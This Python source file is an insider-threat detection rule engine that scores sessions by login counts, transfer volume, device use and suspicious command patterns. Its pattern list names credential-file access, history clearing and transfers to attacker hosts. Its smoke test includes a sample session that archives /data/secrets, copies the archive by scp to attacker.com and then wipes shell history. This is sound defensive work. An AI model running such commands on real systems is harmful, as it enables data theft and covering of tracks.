"""
Deterministic Rule Engine for Insider Threat Detection
=======================================================
Applies heuristic rules to session/user-day data and returns
a structured list of triggered alerts with severity scores.

Each rule is a callable that receives a session dict and
returns an Alert if triggered, or None otherwise.

Designed to work with both:
  • CERT behavioral features  (login_count, bytes, devices)
  • Synthetic command sessions (command_sequence field)
"""

import re
from dataclasses import dataclass, field
from typing import List, Callable, Optional
import pandas as pd
import numpy as np


# ─────────────────────────────────────────────
# SEVERITY CONSTANTS
# ─────────────────────────────────────────────

SEVERITY_LOW    = 0.2
SEVERITY_MEDIUM = 0.5
SEVERITY_HIGH   = 0.8
SEVERITY_CRIT   = 1.0


# ─────────────────────────────────────────────
# DATA CLASSES
# ─────────────────────────────────────────────

@dataclass
class Alert:
    """Single triggered rule alert."""
    rule_name:   str
    severity:    float       # 0.0 – 1.0
    description: str


@dataclass
class RuleResult:
    """Aggregated result from all rules for one session."""
    session_id:   str
    alerts:       List[Alert] = field(default_factory=list)
    rule_score:   float = 0.0

    @property
    def triggered(self) -> bool:
        return len(self.alerts) > 0

    @property
    def max_severity(self) -> float:
        return max((a.severity for a in self.alerts), default=0.0)

    @property
    def rule_names(self) -> List[str]:
        return [a.rule_name for a in self.alerts]


# ─────────────────────────────────────────────
# THRESHOLDS  (tune these as needed)
# ─────────────────────────────────────────────

BYTES_THRESHOLD       = 500_000_000    # 500 MB
LOGIN_THRESHOLD       = 8             # logins/day
DEVICE_THRESHOLD      = 4             # unique devices/day
SUDO_COUNT_THRESHOLD  = 5             # sudo calls/session


# ─────────────────────────────────────────────
# HELPER — safe field access
# ─────────────────────────────────────────────

def _get(session: dict, key: str, default=0):
    """Safely retrieve a field, returning default if missing or NaN."""
    val = session.get(key, default)
    if isinstance(val, float) and np.isnan(val):
        return default
    return val


def _get_commands(session: dict) -> str:
    """Return the command_sequence string (empty if absent)."""
    return str(_get(session, "command_sequence", ""))


# ═════════════════════════════════════════════
# INDIVIDUAL RULES
# ═════════════════════════════════════════════


def rule_after_hours_usb(session: dict) -> Optional[Alert]:
    """USB device usage during after-hours sessions."""
    after_hours = _get(session, "after_hours", 0)
    devices     = _get(session, "unique_devices_used", 0)

    if after_hours and devices >= 2:
        return Alert(
            rule_name="after_hours_usb",
            severity=SEVERITY_HIGH,
            description=(
                f"After-hours session with {int(devices)} USB devices. "
                f"Potential physical data exfiltration."
            ),
        )
    return None


def rule_high_bytes_transfer(session: dict) -> Optional[Alert]:
    """Data transfer volume exceeds threshold."""
    raw_bytes = _get(session, "total_bytes_transferred", 0)

    if raw_bytes > BYTES_THRESHOLD:
        mb = raw_bytes / 1_000_000
        severity = SEVERITY_HIGH if raw_bytes > BYTES_THRESHOLD * 2 else SEVERITY_MEDIUM
        return Alert(
            rule_name="high_bytes_transfer",
            severity=severity,
            description=f"Transferred {mb:,.0f} MB in a single session (threshold: {BYTES_THRESHOLD/1e6:.0f} MB).",
        )
    return None


def rule_excessive_logins(session: dict) -> Optional[Alert]:
    """Abnormally high login count in a single day."""
    logins = _get(session, "login_count", 0)

    if logins >= LOGIN_THRESHOLD:
        severity = SEVERITY_CRIT if logins >= LOGIN_THRESHOLD * 2 else SEVERITY_MEDIUM
        return Alert(
            rule_name="excessive_logins",
            severity=severity,
            description=f"{int(logins)} logins in one day (threshold: {LOGIN_THRESHOLD}). Possible brute-force or credential sharing.",
        )
    return None


def rule_many_devices(session: dict) -> Optional[Alert]:
    """Unusually high number of unique devices in one day."""
    devices = _get(session, "unique_devices_used", 0)

    if devices >= DEVICE_THRESHOLD:
        return Alert(
            rule_name="many_devices",
            severity=SEVERITY_MEDIUM,
            description=f"{int(devices)} unique devices used (threshold: {DEVICE_THRESHOLD}). Possible device hopping.",
        )
    return None


# ─── Command-sequence rules (for synthetic / live data) ───


SUSPICIOUS_PATTERNS = [
    (r"\bchmod\s+777\b",                 "chmod 777 — full world-writable permissions"),
    (r"\b/etc/shadow\b",                 "Accessed /etc/shadow — credential harvesting"),
    (r"\b/etc/passwd\b",                 "Accessed /etc/passwd — user enumeration"),
    (r"\bnmap\b",                        "nmap — network reconnaissance scan"),
    (r"\bsshpass\b",                     "sshpass — automated SSH with embedded password"),
    (r"\bbase64\b.*\beval\b",            "base64 + eval — obfuscated code execution"),
    (r"\bcrontab\s+-[ei]",               "crontab edit — persistence mechanism"),
    (r"\bwget\b.*attacker|evil|malware", "wget to suspicious host"),
    (r"\bcurl\b.*attacker|evil|malware", "curl to suspicious host"),
    (r"\bdd\s+if=/dev/",                 "dd raw disk read — potential disk imaging"),
    (r"\bhistory\s+-c\b",               "history -c — clearing command history (anti-forensics)"),
    (r"\bunset\s+HISTFILE\b",           "unset HISTFILE — disabling history logging"),
    (r"\bkill\b.*-9",                    "kill -9 — forceful process termination"),
]

_COMPILED_PATTERNS = [(re.compile(p, re.IGNORECASE), desc) for p, desc in SUSPICIOUS_PATTERNS]


def rule_suspicious_commands(session: dict) -> Optional[Alert]:
    """Session contains known-suspicious command patterns."""
    cmd_seq = _get_commands(session)
    if not cmd_seq:
        return None

    matches = []
    for pattern, desc in _COMPILED_PATTERNS:
        if pattern.search(cmd_seq):
            matches.append(desc)

    if matches:
        n = len(matches)
        severity = SEVERITY_CRIT if n >= 3 else (SEVERITY_HIGH if n >= 2 else SEVERITY_MEDIUM)
        return Alert(
            rule_name="suspicious_commands",
            severity=severity,
            description=f"{n} suspicious pattern(s): {'; '.join(matches[:5])}",
        )
    return None


_ARCHIVE_RE  = re.compile(r"\b(tar|zip|7z|gzip|bzip2)\b", re.IGNORECASE)
_TRANSFER_RE = re.compile(r"\b(scp|rsync|curl|wget|ftp|nc|netcat)\b", re.IGNORECASE)


def rule_exfiltration_pattern(session: dict) -> Optional[Alert]:
    """Detects archive-then-transfer pattern (tar/zip followed by scp/curl)."""
    cmd_seq = _get_commands(session)
    if not cmd_seq:
        return None

    commands = cmd_seq.split(" -> ")

    archive_idx  = None
    transfer_idx = None

    for i, cmd in enumerate(commands):
        if archive_idx is None and _ARCHIVE_RE.search(cmd):
            archive_idx = i
        if archive_idx is not None and _TRANSFER_RE.search(cmd):
            transfer_idx = i
            break

    if archive_idx is not None and transfer_idx is not None and transfer_idx > archive_idx:
        return Alert(
            rule_name="exfiltration_pattern",
            severity=SEVERITY_CRIT,
            description=(
                f"Archive command at position {archive_idx} followed by "
                f"transfer command at position {transfer_idx}. "
                f"Classic data exfiltration chain."
            ),
        )
    return None


def rule_privilege_escalation(session: dict) -> Optional[Alert]:
    """Detects sudo/su privilege escalation beyond normal usage."""
    cmd_seq = _get_commands(session)
    if not cmd_seq:
        return None

    sudo_count = len(re.findall(r"\bsudo\b", cmd_seq, re.IGNORECASE))
    has_su     = bool(re.search(r"\bsudo\s+su\b|\bsu\s+-\b|\bsu\s+root\b", cmd_seq, re.IGNORECASE))

    if has_su:
        return Alert(
            rule_name="privilege_escalation",
            severity=SEVERITY_HIGH,
            description="sudo su / su root detected — full privilege escalation attempt.",
        )
    if sudo_count >= SUDO_COUNT_THRESHOLD:
        return Alert(
            rule_name="privilege_escalation",
            severity=SEVERITY_MEDIUM,
            description=f"{sudo_count} sudo calls in session (threshold: {SUDO_COUNT_THRESHOLD}). Elevated privilege activity.",
        )
    return None


def rule_after_hours_high_transfer(session: dict) -> Optional[Alert]:
    """Large data transfer specifically during after-hours."""
    after_hours = _get(session, "after_hours", 0)
    raw_bytes   = _get(session, "total_bytes_transferred", 0)

    if after_hours and raw_bytes > BYTES_THRESHOLD * 0.5:
        mb = raw_bytes / 1_000_000
        return Alert(
            rule_name="after_hours_high_transfer",
            severity=SEVERITY_HIGH,
            description=f"After-hours transfer of {mb:,.0f} MB. Night-time bulk exfiltration risk.",
        )
    return None


# ─────────────────────────────────────────────
# RULE REGISTRY
# ─────────────────────────────────────────────

ALL_RULES: List[Callable] = [
    rule_after_hours_usb,
    rule_high_bytes_transfer,
    rule_excessive_logins,
    rule_many_devices,
    rule_suspicious_commands,
    rule_exfiltration_pattern,
    rule_privilege_escalation,
    rule_after_hours_high_transfer,
]


# ─────────────────────────────────────────────
# ENGINE
# ─────────────────────────────────────────────

def evaluate_session(session: dict, rules: List[Callable] = None) -> RuleResult:
    """
    Run all rules against a single session.

    Returns a RuleResult with:
      • alerts  — list of Alert objects for each triggered rule
      • rule_score — composite 0–1 score (capped max of weighted severities)
    """
    if rules is None:
        rules = ALL_RULES

    session_id = str(_get(session, "session_id", "unknown"))
    result = RuleResult(session_id=session_id)

    for rule_fn in rules:
        alert = rule_fn(session)
        if alert is not None:
            result.alerts.append(alert)

    # Composite score: weighted sum of severities, capped at 1.0
    if result.alerts:
        raw = sum(a.severity for a in result.alerts) / len(ALL_RULES)
        result.rule_score = round(min(raw * 2.0, 1.0), 4)  # scale up but cap

    return result


def evaluate_dataframe(df: pd.DataFrame, rules: List[Callable] = None) -> pd.DataFrame:
    """
    Run the rule engine across an entire DataFrame.

    Adds columns:
      • rule_score       — composite 0–1 score
      • rule_count       — number of triggered rules
      • rule_names       — comma-separated list of triggered rule names
      • rule_max_sev     — highest severity among triggered rules
    """
    scores    = []
    counts    = []
    names     = []
    max_sevs  = []

    for _, row in df.iterrows():
        session = row.to_dict()
        result  = evaluate_session(session, rules)
        scores.append(result.rule_score)
        counts.append(len(result.alerts))
        names.append(", ".join(result.rule_names) if result.alerts else "")
        max_sevs.append(result.max_severity)

    df = df.copy()
    df["rule_score"]   = scores
    df["rule_count"]   = counts
    df["rule_names"]   = names
    df["rule_max_sev"] = max_sevs

    return df


# ─────────────────────────────────────────────
# CLI SMOKE TEST
# ─────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("  Rule Engine — Smoke Test")
    print("=" * 60)

    test_sessions = [
        {
            "session_id": "benign-001",
            "after_hours": 0,
            "unique_devices_used": 1,
            "total_bytes_transferred": 10_000,
            "login_count": 2,
            "command_sequence": "ls -> cd /home -> cat README.md",
        },
        {
            "session_id": "suspicious-001",
            "after_hours": 1,
            "unique_devices_used": 3,
            "total_bytes_transferred": 100_000_000,
            "login_count": 9,
            "command_sequence": "sudo su -> cat /etc/shadow -> nmap 192.168.1.0/24",
        },
        {
            "session_id": "malicious-001",
            "after_hours": 1,
            "unique_devices_used": 5,
            "total_bytes_transferred": 5_000_000_000,
            "login_count": 15,
            "command_sequence": (
                "sudo su -> find / -name *.db -> "
                "tar czf /tmp/dump.tar.gz /data/secrets -> "
                "scp /tmp/dump.tar.gz attacker.com:/loot/ -> "
                "history -c -> unset HISTFILE"
            ),
        },
    ]

    for session in test_sessions:
        result = evaluate_session(session)
        label = "✓ CLEAN" if not result.triggered else f"⚠ FLAGGED (score={result.rule_score:.2f})"
        print(f"\n  [{result.session_id}]  {label}")
        for alert in result.alerts:
            print(f"    [{alert.severity:.1f}] {alert.rule_name}: {alert.description}")

    # DataFrame batch test
    print(f"\n{'─' * 60}")
    print("  DataFrame batch test:")
    test_df = pd.DataFrame(test_sessions)
    scored  = evaluate_dataframe(test_df)
    print(scored[["session_id", "rule_score", "rule_count", "rule_names"]].to_string(index=False))

    print(f"\n{'=' * 60}")
